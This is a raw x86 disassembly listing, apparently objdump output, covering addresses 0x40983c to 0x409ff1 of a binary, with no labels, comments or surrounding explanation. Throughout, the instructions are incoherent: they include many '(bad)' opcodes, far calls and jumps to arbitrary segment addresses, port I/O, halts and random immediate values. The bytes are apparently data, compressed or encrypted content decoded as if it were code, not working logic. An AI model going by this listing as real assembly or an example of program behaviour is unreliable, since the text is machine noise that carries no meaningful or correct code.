  40983c:	ins    BYTE PTR es:[edi],dx
  40983d:	pop    ebp
  40983e:	ror    BYTE PTR [edi-0x7943e251],1
  409844:	ret    0x766f
  409847:	ds inc eax
  409849:	adc    eax,0x80490598
  40984e:	outs   dx,DWORD PTR ds:[esi]
  40984f:	xchg   ebp,eax
  409850:	mov    ah,0x63
  409852:	ins    BYTE PTR es:[edi],dx
  409853:	mov    ds:0x1c989f18,al
  409858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409859:	out    dx,al
  40985a:	jno    0x409897
  40985c:	int    0x8f
  40985e:	xor    BYTE PTR [eax],bh
  409860:	rol    DWORD PTR [edi+0x42ec8612],cl
  409866:	nop
  409867:	gs sub al,0x20
  40986a:	cmp    eax,0x773376a5
  40986f:	xor    ebx,ebx
  409871:	es mov eax,0xb4875cc7
  409877:	pop    edi
  409878:	mov    DWORD PTR [edi+0x52],eax
  40987b:	jmp    0xf910:0xc1b561d7
  409882:	pushf  
  409883:	call   0x89aa:0xfacb2173
  40988a:	fmul   st,st(4)
  40988c:	cmp    al,0x6c
  40988e:	ror    BYTE PTR [ebx],1
  409890:	inc    edi
  409891:	inc    esi
  409892:	hlt    
  409893:	sbb    al,BYTE PTR [edx]
  409895:	imul   eax,DWORD PTR [esp+ebp*1+0x78],0xffffff95
  40989a:	mov    cl,0xa9
  40989c:	arpl   WORD PTR [edx-0x79],dx
  40989f:	mov    dl,0x7f
  4098a1:	dec    eax
  4098a2:	cmp    esi,DWORD PTR [edx+0x2204c60a]
  4098a8:	(bad)  
  4098a9:	sbb    BYTE PTR [edx],bl
  4098ab:	fadd   DWORD PTR [edx+0x67174021]
  4098b1:	imul   edx
  4098b3:	add    eax,0x8bb94395
  4098b8:	int3   
  4098b9:	js     0x409852
  4098bb:	loopne 0x4098f1
  4098bd:	inc    edx
  4098be:	stc    
  4098bf:	add    al,0x97
  4098c1:	inc    edi
  4098c2:	mov    esp,0x4e39484d
  4098c7:	nop
  4098c8:	xor    DWORD PTR fs:[edx],esi
  4098cb:	push   ebx
  4098cc:	outs   dx,DWORD PTR ds:[esi]
  4098cd:	xor    DWORD PTR [ebx-0x32a5f5bc],ebx
  4098d3:	adc    eax,0x6a8f2c8c
  4098d8:	ja     0x40986e
  4098da:	fpatan 
  4098dc:	push   edx
  4098dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098de:	hlt    
  4098df:	cmp    al,0x39
  4098e1:	in     al,dx
  4098e2:	test   al,0x5e
  4098e4:	test   BYTE PTR [edi-0x5b],al
  4098e7:	les    edi,FWORD PTR [edx]
  4098e9:	(bad)  
  4098ea:	outs   dx,DWORD PTR ds:[esi]
  4098eb:	test   DWORD PTR [edi+0x592acd96],eax
  4098f1:	lock mov ah,0x24
  4098f4:	data16 mov bl,0x86
  4098f7:	sahf   
  4098f8:	jecxz  0x40994e
  4098fa:	xchg   ebp,eax
  4098fb:	lahf   
  4098fc:	fcomi  st,st(7)
  4098fe:	fiadd  DWORD PTR [esi]
  409900:	int3   
  409901:	(bad)  
  409902:	out    dx,eax
  409903:	mov    dh,0x3e
  409905:	xor    ebp,DWORD PTR [ebp-0x37041273]
  40990b:	mov    edi,0x5edadfd2
  409910:	sub    DWORD PTR [ebx],esp
  409912:	test   al,0x79
  409914:	xchg   edx,eax
  409915:	arpl   WORD PTR [edi+ecx*8-0x15],di
  409919:	dec    ebp
  40991a:	sbb    dl,bh
  40991c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40991d:	loop   0x4098b9
  40991f:	cmp    ah,dh
  409921:	sub    BYTE PTR [edi],al
  409923:	xchg   edx,eax
  409924:	imul   esi,DWORD PTR [ebp+edi*1+0x77],0x3145f0b8
  40992c:	mov    bh,al
  40992e:	test   eax,0xeaf2f99b
  409933:	cdq    
  409934:	in     eax,0x1d
  409936:	retf   
  409937:	(bad)  [eax+0x26635bd6]
  40993d:	xchg   edx,eax
  40993e:	xor    DWORD PTR [ecx],esp
  409940:	fisubr WORD PTR [ebx]
  409942:	repz push esi
  409944:	fbld   TBYTE PTR [esi+0x69]
  409947:	sub    edx,DWORD PTR [edi+ebp*8]
  40994a:	(bad)  
  40994b:	and    ah,BYTE PTR [ebx]
  40994d:	loop   0x40995e
  40994f:	xlat   BYTE PTR ds:[ebx]
  409950:	jle    0x409985
  409952:	sar    ecx,cl
  409954:	sbb    cl,BYTE PTR [esi+0x1d]
  409957:	push   eax
  409958:	es aas 
  40995a:	xchg   ebp,eax
  40995b:	mov    eax,0x1129892c
  409960:	sar    BYTE PTR [esi],1
  409962:	fs push esp
  409964:	inc    edi
  409965:	sub    al,0x76
  409967:	outs   dx,DWORD PTR ds:[esi]
  409968:	je     0x4099da
  40996a:	cmp    BYTE PTR [esi-0x2a],bl
  40996d:	loope  0x4098f6
  40996f:	inc    esi
  409970:	dec    ecx
  409971:	inc    esi
  409972:	fpatan 
  409974:	push   es
  409975:	and    cl,ch
  409977:	shl    BYTE PTR [esi+0xc7667f0],1
  40997d:	scas   al,BYTE PTR es:[edi]
  40997e:	test   eax,0xbe4549a6
  409983:	fadd   DWORD PTR [esi+ecx*8+0x5e]
  409987:	jno    0x409944
  409989:	nop
  40998a:	cs mov esi,0xd7669e72
  409990:	js     0x409984
  409992:	lods   eax,DWORD PTR ds:[esi]
  409993:	stos   DWORD PTR es:[edi],eax
  409994:	(bad)  
  409995:	jnp    0x409947
  409997:	loop   0x409935
  409999:	push   esi
  40999a:	pushf  
  40999b:	push   ds
  40999c:	and    DWORD PTR [edi+0x30745fdf],eax
  4099a2:	pop    edx
  4099a3:	repz sbb ebp,DWORD PTR [ecx-0x78]
  4099a7:	add    al,0xfc
  4099a9:	and    eax,0xdaef3d69
  4099ae:	call   0xf4c2:0x7edb904d
  4099b5:	mov    ecx,0x48a89239
  4099ba:	bnd jge 0x4099c7
  4099bd:	sub    al,0x5d
  4099bf:	push   edi
  4099c0:	mov    fs,WORD PTR ds:0x4eb2a5f5
  4099c6:	packsswb mm2,QWORD PTR ds:0x648a8084
  4099ce:	add    BYTE PTR [edi+0x31],bl
  4099d1:	add    edx,ecx
  4099d3:	dec    ecx
  4099d4:	or     esi,eax
  4099d6:	out    dx,eax
  4099d7:	bound  esp,QWORD PTR [ebx]
  4099d9:	mov    BYTE PTR [edi+0x3c],bl
  4099dc:	push   es
  4099dd:	loope  0x4099d6
  4099df:	lahf   
  4099e0:	inc    eax
  4099e1:	in     eax,dx
  4099e2:	imul   eax,DWORD PTR [eax+eax*8-0x2bac1a24],0xad011f93
  4099ed:	retf   
  4099ee:	sub    ah,BYTE PTR [ebx+0x6c]
  4099f1:	jb     0x409a3d
  4099f3:	pop    ebp
  4099f4:	mov    dh,0xd9
  4099f6:	ror    DWORD PTR [ebx+0xb3e898f],1
  4099fc:	xor    BYTE PTR [edi],ch
  4099fe:	call   0xab206e1c
  409a03:	cmp    DWORD PTR cs:[ecx],esi
  409a06:	sub    DWORD PTR [edx],0x62
  409a09:	div    DWORD PTR [edx+0x7b5de9eb]
  409a0f:	fcmovb st,st(2)
  409a11:	std    
  409a12:	jmp    0x409996
  409a14:	enter  0xc259,0x5
  409a18:	sub    cl,BYTE PTR [eax-0x39]
  409a1b:	fcos   
  409a1d:	sbb    bh,BYTE PTR [ebp-0x6db50932]
  409a23:	call   0x7c34:0x9310b6b5
  409a2a:	lahf   
  409a2b:	retf   0xbca1
  409a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a2f:	call   0xdd2db2da
  409a34:	inc    edi
  409a35:	or     eax,0x2b541dcc
  409a3a:	jecxz  0x4099bf
  409a3c:	push   cs
  409a3d:	not    DWORD PTR [ecx+eax*8+0x4fe61a23]
  409a44:	adc    eax,0x92ae3313
  409a49:	idiv   BYTE PTR [edi-0x8]
  409a4c:	int3   
  409a4d:	(bad)  
  409a4e:	xor    esi,ebx
  409a50:	dec    ebp
  409a51:	mov    ebp,0xd57445d6
  409a56:	loope  0x409ad7
  409a58:	jnp    0x409a3b
  409a5a:	ret    
  409a5b:	adc    al,0x9c
  409a5d:	sub    BYTE PTR [esp+esi*2],ch
  409a60:	js     0x409a55
  409a62:	pop    ds
  409a63:	test   DWORD PTR [edx],ecx
  409a65:	inc    edx
  409a66:	(bad)  
  409a67:	pop    ebx
  409a68:	shl    DWORD PTR [edi+ebp*1+0x79],0xb7
  409a6d:	shl    DWORD PTR [ebp+eiz*1+0x5],1
  409a71:	lahf   
  409a72:	xchg   esi,eax
  409a73:	int3   
  409a74:	mov    ebx,0x315aaca4
  409a79:	push   esi
  409a7a:	inc    ecx
  409a7b:	mov    ah,0x93
  409a7d:	fbstp  TBYTE PTR [esp+eax*8+0x19]
  409a81:	xchg   edx,eax
  409a82:	jbe    0x409af3
  409a84:	xlat   BYTE PTR ds:[ebx]
  409a85:	lock test al,0x2d
  409a88:	jo     0x409aff
  409a8a:	dec    ecx
  409a8b:	rcl    BYTE PTR [eax+0x28bf23de],0x35
  409a92:	jae    0x409aa2
  409a94:	add    eax,DWORD PTR [ecx+0x6a2e535a]
  409a9a:	fistp  DWORD PTR [ebx+0x6f]
  409a9d:	pop    esi
  409a9e:	dec    ecx
  409a9f:	or     esi,DWORD PTR [eax+0x36f50b9b]
  409aa5:	or     esi,ebx
  409aa7:	cmp    ch,BYTE PTR [edi-0x591ec1d0]
  409aad:	sub    DWORD PTR [eax+eiz*4+0xa78f26f],ebp
  409ab4:	scas   al,BYTE PTR es:[edi]
  409ab5:	xchg   ebp,eax
  409ab6:	jne    0x409b00
  409ab8:	cmc    
  409ab9:	test   eax,0x92c28b66
  409abe:	sbb    eax,DWORD PTR [edi]
  409ac0:	xor    ebp,eax
  409ac2:	mov    ah,0xb2
  409ac4:	sub    eax,0x47f31dcf
  409ac9:	enter  0xbd83,0x19
  409acd:	xor    DWORD PTR [ecx],esp
  409acf:	fmulp  st(0),st
  409ad1:	js     0x409ae2
  409ad3:	fs test eax,0x85d66f9b
  409ad9:	inc    edi
  409ada:	mov    edx,0xd9b7026a
  409adf:	xchg   esp,eax
  409ae0:	push   eax
  409ae1:	iret   
  409ae2:	push   ecx
  409ae3:	mov    ebp,0x6d26e9ef
  409ae8:	mov    al,ds:0xec1183e
  409aed:	icebp  
  409aee:	push   cs
  409aef:	test   DWORD PTR [ecx+0x1c0474f3],ecx
  409af5:	push   es
  409af6:	pusha  
  409af7:	sub    eax,0xc477aaed
  409afc:	push   0x6d
  409afe:	xor    eax,0x3058d2dc
  409b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b04:	mov    esi,0x593f7d92
  409b09:	fst    DWORD PTR [ebp+0x2d748730]
  409b0f:	outs   dx,DWORD PTR ds:[esi]
  409b10:	or     al,0x9d
  409b12:	mov    dl,0xc6
  409b14:	mov    bh,0x9b
  409b16:	fsubr  DWORD PTR [ebx+0x30588829]
  409b1c:	xor    ebx,ebp
  409b1e:	jbe    0x409b94
  409b20:	adc    edx,DWORD PTR ds:0x664537a6
  409b26:	or     BYTE PTR [ebp-0x748f992d],cl
  409b2c:	pop    esi
  409b2d:	sbb    BYTE PTR [ecx+0x4af08695],dh
  409b33:	sbb    dl,dh
  409b35:	ret    0xacb3
  409b38:	je     0x409ac7
  409b3a:	ja     0x409bae
  409b3c:	jmp    0x409b82
  409b3e:	dec    eax
  409b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b40:	out    0x94,eax
  409b42:	push   esi
  409b43:	scas   al,BYTE PTR es:[edi]
  409b44:	jns    0x409af2
  409b46:	imul   ecx,ebp,0x5d0b9948
  409b4c:	ins    DWORD PTR es:[edi],dx
  409b4d:	out    dx,al
  409b4e:	mov    ah,0xd1
  409b50:	xor    al,0x99
  409b52:	mov    ds:0xe2f11a9a,eax
  409b57:	out    dx,al
  409b58:	mov    ch,0x75
  409b5a:	push   edi
  409b5b:	and    ebx,edx
  409b5d:	pop    ecx
  409b5e:	aam    0x59
  409b60:	xchg   DWORD PTR [ebx+0x37],ebp
  409b63:	loop   0x409b06
  409b65:	leave  
  409b66:	(bad)
  409b6b:	dec    esp
  409b6c:	mov    ebx,0xf8060579
  409b71:	push   cs
  409b72:	repnz push eax
  409b74:	mov    ah,0x58
  409b76:	and    eax,esi
  409b78:	push   cs
  409b79:	or     al,0x6e
  409b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b7c:	dec    edx
  409b7d:	and    eax,0x4aabd651
  409b82:	xchg   bh,cl
  409b84:	mov    esi,0x44c244c
  409b89:	inc    esp
  409b8a:	push   ecx
  409b8b:	fwait
  409b8c:	lahf   
  409b8d:	mov    bh,0x0
  409b8f:	fistp  QWORD PTR [edx+eiz*8]
  409b92:	cld    
  409b93:	sub    BYTE PTR [ecx+ecx*4+0x1],bh
  409b97:	addr16 pop ds
  409b99:	ror    dh,1
  409b9b:	add    DWORD PTR [ecx-0x74],edi
  409b9e:	add    eax,0x71c4f20d
  409ba3:	jmp    0xb040f76f
  409ba8:	xchg   ecx,eax
  409ba9:	sub    al,0xa7
  409bab:	stc    
  409bac:	add    cl,BYTE PTR [eax+0x13]
  409baf:	retf   
  409bb0:	inc    edi
  409bb1:	sbb    eax,0x3868d1d3
  409bb6:	cli    
  409bb7:	pop    ebx
  409bb8:	jecxz  0x409c35
  409bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bbb:	adc    ebp,DWORD PTR [edi]
  409bbd:	loop   0x409bac
  409bbf:	lods   eax,DWORD PTR ds:[esi]
  409bc0:	push   edx
  409bc1:	pusha  
  409bc2:	push   eax
  409bc3:	mov    WORD PTR [eax-0x69],gs
  409bc6:	pop    ss
  409bc7:	rcr    bh,0xf5
  409bca:	in     eax,dx
  409bcb:	mov    ds:0xbd707daf,al
  409bd0:	int3   
  409bd1:	jp     0x409b9f
  409bd3:	adc    BYTE PTR [eax+edx*2-0x2cb75d85],al
  409bda:	mov    bl,0x47
  409bdc:	pop    es
  409bdd:	pop    ds
  409bde:	dec    ecx
  409bdf:	mov    eax,0x650ff53c
  409be4:	dec    esi
  409be5:	ds shr eax,0xf3
  409be9:	out    dx,eax
  409bea:	mov    dl,0xbd
  409bec:	adc    al,0xd5
  409bee:	mov    eax,0x90d4a9bd
  409bf3:	xor    cl,0xb9
  409bf6:	adc    cl,BYTE PTR [di-0x6b]
  409bfa:	push   eax
  409bfb:	pop    ecx
  409bfc:	mov    ds:0x307ed80b,al
  409c01:	or     BYTE PTR [edx+0x1b],ah
  409c04:	cdq    
  409c05:	xchg   edx,eax
  409c06:	sub    BYTE PTR [ecx+0x6],0x6a
  409c0a:	xor    al,ch
  409c0c:	push   esp
  409c0d:	retf   0xcd71
  409c10:	pop    ebp
  409c11:	sbb    eax,0x9e0d8747
  409c16:	dec    ebx
  409c17:	retf   
  409c18:	xor    BYTE PTR [esi+0x47],0x5d
  409c1c:	pop    edx
  409c1d:	test   eax,0x11f09eae
  409c22:	std    
  409c23:	pop    edi
  409c24:	sub    esp,DWORD PTR [eax-0x28]
  409c27:	xchg   BYTE PTR [edx-0x117afd6f],ch
  409c2d:	mov    ds:0x99b86de3,al
  409c32:	xchg   ebx,eax
  409c33:	outs   dx,DWORD PTR ds:[esi]
  409c34:	add    al,0xa4
  409c36:	das    
  409c37:	call   0xfad5:0xa557b36f
  409c3e:	data16 sub al,dl
  409c41:	adc    dl,BYTE PTR [edi+ecx*8+0x12b2d968]
  409c48:	(bad)  
  409c49:	fsub   DWORD PTR [edi+0x2a]
  409c4c:	loop   0x409c6f
  409c4e:	or     BYTE PTR [ecx+0x5941c9f2],bh
  409c54:	dec    ebx
  409c55:	xchg   edx,eax
  409c56:	sub    DWORD PTR [eax-0x7f],edx
  409c59:	sub    DWORD PTR [ecx+edi*8-0x12],edi
  409c5d:	js     0x409c13
  409c5f:	test   DWORD PTR [esi-0x14],0x53ae7b76
  409c66:	cmp    eax,0x25d8730
  409c6b:	push   0x2a
  409c6d:	mov    ecx,0xe1f93a10
  409c72:	popf   
  409c73:	xor    cl,BYTE PTR [eax+eax*1]
  409c76:	push   edx
  409c77:	sbb    ecx,eax
  409c79:	or     bl,BYTE PTR [ebx-0x9]
  409c7c:	enter  0x79a,0x28
  409c80:	mov    al,ds:0x766ea321
  409c85:	xchg   ebp,eax
  409c86:	push   esp
  409c87:	pop    edx
  409c88:	and    BYTE PTR [edi],ah
  409c8a:	add    eax,0x9567e45
  409c8f:	stos   DWORD PTR es:[edi],eax
  409c90:	clc    
  409c91:	add    DWORD PTR [ebx+0x23],ecx
  409c94:	or     ah,BYTE PTR [eax-0x374c9cd7]
  409c9a:	cmp    al,0xc4
  409c9c:	test   al,0x9
  409c9e:	fldcw  WORD PTR [ebx-0x798d4b55]
  409ca4:	mov    ebx,0xa96f6412
  409ca9:	or     eax,0x924961e3
  409cae:	sbb    eax,0x159deda7
  409cb3:	mov    dl,0x2b
  409cb5:	xchg   edi,eax
  409cb6:	outs   dx,DWORD PTR ds:[esi]
  409cb7:	test   BYTE PTR [eax+edi*8],dl
  409cba:	mov    esp,0xf229266e
  409cbf:	ret    
  409cc0:	sub    ebp,ebx
  409cc2:	add    edx,ebx
  409cc4:	add    eax,0x33e0a01b
  409cc9:	dec    esi
  409cca:	pop    ss
  409ccb:	fadd   DWORD PTR [eax+0x5302a715]
  409cd1:	cmp    BYTE PTR [eax],0x5c
  409cd4:	fnstenv [eax-0x5c4f4b70]
  409cda:	sbb    eax,0xe64b0ca5
  409cdf:	mov    dh,0x5d
  409ce1:	mov    ds:0xcedf30ff,al
  409ce6:	bound  edx,QWORD PTR [edx]
  409ce8:	pop    ss
  409ce9:	call   0x6cb444c7
  409cee:	into   
  409cef:	or     ecx,DWORD PTR [ecx]
  409cf1:	ss add dl,al
  409cf4:	sbb    bl,BYTE PTR [ebp+0x7c]
  409cf7:	sbb    BYTE PTR [eax+0x7f],ah
  409cfa:	jo     0x409d69
  409cfc:	cdq    
  409cfd:	repnz and BYTE PTR [ebx+0x34],ch
  409d01:	les    esi,FWORD PTR [eax+0x12]
  409d04:	das    
  409d05:	mov    ss,esp
  409d07:	xchg   edi,eax
  409d08:	clc    
  409d09:	jecxz  0x409cfa
  409d0b:	or     al,0x15
  409d0d:	add    al,dl
  409d0f:	xor    DWORD PTR [esi+0x36],ecx
  409d12:	pop    edx
  409d13:	ins    DWORD PTR es:[edi],dx
  409d14:	mov    WORD PTR [edi-0x1c],ss
  409d17:	cwde   
  409d18:	jns    0x409d5e
  409d1a:	ins    BYTE PTR es:[edi],dx
  409d1b:	pop    esi
  409d1c:	imul   esi,DWORD PTR [ebp-0x2bb7949f],0x22cc6012
  409d26:	adc    esi,esi
  409d28:	not    ecx
  409d2a:	adc    DWORD PTR [esi+eiz*4-0x48],esp
  409d2e:	test   BYTE PTR [eax+esi*2+0x1b],ch
  409d32:	adc    al,0x3b
  409d34:	mov    al,BYTE PTR [esi]
  409d36:	push   ss
  409d37:	and    DWORD PTR [ecx],0x84e41d65
  409d3d:	popf   
  409d3e:	or     DWORD PTR [esi+0x46],0x71
  409d42:	mov    esi,ebx
  409d44:	inc    eax
  409d45:	ret    0x4f1a
  409d48:	int    0x41
  409d4a:	gs dec ebp
  409d4c:	pop    ss
  409d4d:	cmc    
  409d4e:	fmul   DWORD PTR [ecx+0x6a44bb33]
  409d54:	out    0x58,eax
  409d56:	mov    ecx,ecx
  409d58:	mov    cl,0xde
  409d5a:	cmp    esp,DWORD PTR [edx]
  409d5c:	mov    DWORD PTR [ecx],eax
  409d5e:	scas   al,BYTE PTR es:[edi]
  409d5f:	out    0x77,al
  409d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d62:	jnp    0x409ce4
  409d64:	sbb    edi,DWORD PTR [edi-0x229eb596]
  409d6a:	mov    dh,0x7d
  409d6c:	int3   
  409d6d:	xor    eax,0x6ae8fff8
  409d72:	and    al,0x51
  409d74:	nop
  409d75:	jo     0x409d12
  409d77:	sbb    al,0xea
  409d79:	sbb    DWORD PTR [ebx],esp
  409d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7c:	add    ch,dh
  409d7e:	jno    0x409ddb
  409d80:	adc    eax,DWORD PTR [ecx]
  409d82:	and    BYTE PTR [edi+0x1f],al
  409d85:	inc    ecx
  409d86:	arpl   WORD PTR [esi-0x395dcc82],dx
  409d8c:	inc    edx
  409d8d:	inc    ecx
  409d8e:	dec    esi
  409d8f:	(bad)  
  409d90:	loope  0x409d54
  409d92:	xchg   edi,eax
  409d93:	iret   
  409d94:	pop    es
  409d95:	xchg   cl,dh
  409d97:	retf   
  409d98:	imul   ebp,esp,0xffffffd9
  409d9b:	shl    DWORD PTR [edi],cl
  409d9d:	retf   0x8077
  409da0:	pushf  
  409da1:	jle    0x409dc2
  409da3:	idiv   ecx
  409da5:	and    al,0xa
  409da7:	or     edx,DWORD PTR [eax-0x14dc698b]
  409dad:	mov    ecx,0x41b79f2c
  409db2:	inc    ecx
  409db3:	(bad)  
  409db4:	inc    DWORD PTR [ebx-0x7c506e81]
  409dba:	(bad)  
  409dbb:	pop    eax
  409dbc:	ss mov edx,0x71ca22de
  409dc2:	dec    eax
  409dc3:	mov    bl,0x1f
  409dc5:	nop
  409dc6:	push   0x2a
  409dc8:	pop    ss
  409dc9:	mov    esp,0xf78cf555
  409dce:	(bad)
  409dd1:	dec    esp
  409dd2:	sub    eax,0xc93d369
  409dd7:	cmp    eax,0xd8231e7c
  409ddc:	push   ecx
  409ddd:	cld    
  409dde:	test   BYTE PTR [ebx+0x41],bh
  409de1:	dec    edx
  409de2:	(bad)  
  409de3:	popa   
  409de4:	addr16 (bad) 
  409de7:	jl     0x409e2e
  409de9:	lea    ebx,[edx-0x1f]
  409dec:	popa   
  409ded:	or     ch,BYTE PTR [edx]
  409def:	mov    cl,0x84
  409df1:	test   edi,0xf23fb5a9
  409df7:	ror    dl,1
  409df9:	jge    0x409e21
  409dfb:	inc    esp
  409dfc:	mov    al,0x22
  409dfe:	leave  
  409dff:	ret    0x28e
  409e02:	out    0x5d,eax
  409e04:	sub    eax,0x36d9c63c
  409e09:	popa   
  409e0a:	sub    eax,0x3877d89a
  409e0f:	daa    
  409e10:	pop    edx
  409e11:	sub    eax,0xb72bf67b
  409e16:	sbb    eax,0x79169933
  409e1b:	(bad)  
  409e1c:	std    
  409e1d:	and    BYTE PTR [ebx+0x20],al
  409e20:	scas   al,BYTE PTR es:[edi]
  409e21:	pop    esi
  409e22:	xchg   edx,eax
  409e23:	sub    BYTE PTR [edx],ch
  409e25:	jge    0x409e6f
  409e27:	jo     0x409e25
  409e29:	(bad)  
  409e2a:	xchg   esi,eax
  409e2b:	scas   al,BYTE PTR es:[edi]
  409e2c:	test   DWORD PTR [ebp+0x55f81e96],ebx
  409e32:	mov    ds:0x4b7692c5,al
  409e37:	mov    WORD PTR [eax],ss
  409e39:	add    BYTE PTR [eax+edi*2],bh
  409e3c:	pusha  
  409e3d:	pop    ebp
  409e3e:	gs push edx
  409e40:	out    0xdd,al
  409e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e43:	aas    
  409e44:	sub    eax,0xa797c27e
  409e49:	jl     0x409dfc
  409e4b:	adc    cl,BYTE PTR [bx+si]
  409e4e:	in     eax,0x7b
  409e50:	mov    dl,0xbf
  409e52:	cmp    al,0x95
  409e54:	fsubr  QWORD PTR ss:[esi+0x742c05e6]
  409e5b:	idiv   BYTE PTR [ecx]
  409e5d:	cmp    ch,BYTE PTR es:[eax-0x7d]
  409e61:	dec    esp
  409e62:	sbb    DWORD PTR [esi-0x120da739],esi
  409e68:	scas   al,BYTE PTR es:[edi]
  409e69:	pusha  
  409e6a:	out    0x64,eax
  409e6c:	mov    ecx,es
  409e6e:	mov    ebx,DWORD PTR ds:[esi+0x493f951e]
  409e75:	lahf   
  409e76:	push   esi
  409e77:	loope  0x409eed
  409e79:	mov    ch,0x99
  409e7b:	xchg   BYTE PTR [ebp-0x7dfe621f],dl
  409e81:	push   es
  409e82:	test   eax,0x83877125
  409e87:	mov    ch,0x2
  409e89:	rcr    DWORD PTR [edx],1
  409e8b:	fdiv   QWORD PTR [esp+eax*1+0x29a1d372]
  409e92:	mov    al,ds:0x1f0950a4
  409e97:	out    0x22,al
  409e99:	mov    dh,0xdf
  409e9b:	sti    
  409e9c:	test   BYTE PTR [edx],0xcf
  409e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea0:	fadd   QWORD PTR [ecx+0x6e4f52c3]
  409ea6:	dec    ebp
  409ea7:	mov    ecx,0xcb76cb1b
  409eac:	lods   eax,DWORD PTR ds:[esi]
  409ead:	cmp    eax,0x9bfd3866
  409eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eb3:	popa   
  409eb4:	adc    al,0x31
  409eb6:	mov    dh,0x8d
  409eb8:	mov    ch,0xc6
  409eba:	shl    DWORD PTR [ebx-0x2e],0xa7
  409ebe:	dec    edx
  409ebf:	rcl    DWORD PTR [eax-0x51],0x92
  409ec3:	mov    ah,0xde
  409ec5:	mov    bl,0x9b
  409ec7:	pop    ss
  409ec8:	push   ds
  409ec9:	xor    BYTE PTR [esi],bh
  409ecb:	sbb    eax,0xba9f20f6
  409ed0:	cld    
  409ed1:	adc    BYTE PTR [edx+0x79],bh
  409ed4:	cmp    al,BYTE PTR [esi-0x610c9a80]
  409eda:	(bad)  
  409edb:	int    0x39
  409edd:	cmp    eax,DWORD PTR [esi]
  409edf:	lods   eax,DWORD PTR ds:[esi]
  409ee0:	scas   al,BYTE PTR es:[edi]
  409ee1:	loope  0x409ebe
  409ee3:	sbb    edx,esi
  409ee5:	xchg   esp,eax
  409ee6:	stc    
  409ee7:	out    dx,al
  409ee8:	in     eax,0x49
  409eea:	(bad)  
  409eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eec:	daa    
  409eed:	gs or  al,0xb9
  409ef0:	ins    DWORD PTR es:[edi],dx
  409ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef2:	(bad)  
  409ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ef4:	jb     0x409f71
  409ef6:	mov    DWORD PTR [eax+0x5d0b8019],0xdc22570b
  409f00:	and    eax,0x310a217a
  409f05:	inc    eax
  409f06:	(bad)  
  409f07:	into   
  409f08:	sar    DWORD PTR [eax+0x1e82eb44],1
  409f0e:	dec    ebx
  409f0f:	clc    
  409f10:	mov    esi,0x14752961
  409f15:	lea    eax,[edi-0x56e26276]
  409f1b:	mov    esp,0x8a19b51
  409f20:	mov    DWORD PTR [ecx+0x56],edx
  409f23:	xor    BYTE PTR [esi+0x48],ch
  409f26:	call   DWORD PTR [ebx+ecx*1+0x70]
  409f2a:	mov    ah,BYTE PTR [esi+0x7a36a758]
  409f30:	jo     0x409f70
  409f32:	fistp  DWORD PTR [ebx+0x529b3621]
  409f38:	inc    esi
  409f39:	sbb    eax,0x8782deec
  409f3e:	das    
  409f3f:	jp     0x409f74
  409f41:	loopne 0x409f39
  409f43:	inc    esi
  409f44:	lods   al,BYTE PTR ds:[esi]
  409f45:	push   0xcb29df28
  409f4a:	aas    
  409f4b:	and    DWORD PTR [ebx+ecx*4],edx
  409f4e:	call   0x2bf3:0x215d4042
  409f55:	jo     0x409f06
  409f57:	inc    ebx
  409f58:	test   al,bl
  409f5a:	call   0x96c6:0x2e3adf95
  409f61:	addr16 sub dh,cl
  409f64:	cs js  0x409f97
  409f67:	xor    eax,ebp
  409f69:	test   al,0xf5
  409f6b:	xor    BYTE PTR [edi-0x10],ch
  409f6e:	(bad)  [ebp+0x72]
  409f71:	in     eax,0xe6
  409f73:	xchg   edx,eax
  409f74:	mov    al,ds:0xabfe23f8
  409f79:	dec    edx
  409f7a:	dec    DWORD PTR [edx-0x32]
  409f7d:	les    ecx,FWORD PTR [ecx+0xf]
  409f80:	add    BYTE PTR [eax+0x1e],0x10
  409f84:	add    dh,BYTE PTR [ebx+0x7fd32301]
  409f8a:	in     al,dx
  409f8b:	(bad)  
  409f8c:	xlat   BYTE PTR ds:[ebx]
  409f8d:	mov    esp,0x358a3a05
  409f92:	mov    bh,0x61
  409f94:	dec    ecx
  409f95:	xchg   esp,eax
  409f96:	rcr    DWORD PTR [edx+eiz*2-0x23859e03],0x2c
  409f9e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409fa0:	and    DWORD PTR [eax+0x57],ebx
  409fa3:	je     0x409f5d
  409fa5:	in     al,dx
  409fa6:	add    al,0x26
  409fa8:	es (bad) 
  409faa:	hlt    
  409fab:	aam    0x8d
  409fad:	mov    dl,0x82
  409faf:	imul   edi,ecx,0x61
  409fb2:	mov    esp,DWORD PTR ds:0xeadf62f2
  409fb8:	sbb    ax,0xb7e6
  409fbc:	pop    edi
  409fbd:	dec    esp
  409fbe:	xchg   edx,eax
  409fbf:	test   DWORD PTR [ebx-0x16],ebx
  409fc2:	sbb    esi,DWORD PTR [ebp-0x7d3f4948]
  409fc8:	and    DWORD PTR [eax],0x52
  409fcb:	aas    
  409fcc:	xor    ecx,DWORD PTR [ecx]
  409fce:	test   cx,di
  409fd1:	adc    DWORD PTR [ecx],ecx
  409fd3:	aaa    
  409fd4:	and    al,0x50
  409fd6:	mov    ebx,0x768ed944
  409fdb:	push   esi
  409fdc:	push   cs
  409fdd:	test   BYTE PTR [edx],0x13
  409fe0:	out    0x9,eax
  409fe2:	out    dx,eax
  409fe3:	js     0x409fb0
  409fe5:	bound  ebp,QWORD PTR [ebx-0x4dcbe2b0]
  409feb:	shl    BYTE PTR [edx],cl
  409fed:	test   al,dl
  409fef:	jmp    0x409f9f
  409ff1:	(bad)  
